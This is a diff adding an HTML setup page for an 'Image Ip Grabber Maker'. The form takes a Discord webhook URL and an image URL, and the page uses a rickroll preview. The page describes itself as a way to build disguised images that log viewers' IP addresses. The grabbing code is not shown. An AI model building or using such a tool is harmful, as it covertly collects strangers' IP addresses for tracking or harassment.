@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Image Ip Grabber Maker" />
+    <meta name="twitter:site" content="@PopCordDiscord" />
+    <meta name="twitter:url" content="https://cool-images.vercel.app/" />
+    <meta name="twitter:description" content="make your own image ip grabber with a webhook" />
+    <meta name="twitter:image" content="https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif" />
+
+    <meta property="og:url" content="https://cool-images.vercel.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="cool-images">
+    <meta property="og:title" content="Image Ip Grabber Maker">
+    <meta property="og:description" content="make your own image ip grabber with a webhook">
+    <meta property="og:image" content="http://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif">
+    <meta property="og:image:secure_url" content="https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif">
+
+    <meta name="theme-color" content="#00ff7f">
+    <meta name="title" content="Image Ip Grabber Maker">
+    <link rel="icon" href="https://pic.onlinewebfonts.com/thumbnails/icons_239913.svg">
+
+    <title>Image Ip Grabber Maker</title>
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+    <style>
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card text-center">
+            <div class="card-body">
+                <h1>Image Ip Grabber Setup</h1>
+                <form action="/setup" method="post">
+                    <div class="form-group">
+                        <label for="token">Discord Webhook Url:</label>
+                        <input type="text" id="token" name="token" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="image_url">Image URL (optional): </label>
+                        <input type="text" id="image_url" name="image_url" class="form-control">
+                    </div>
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-primary">Submit</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
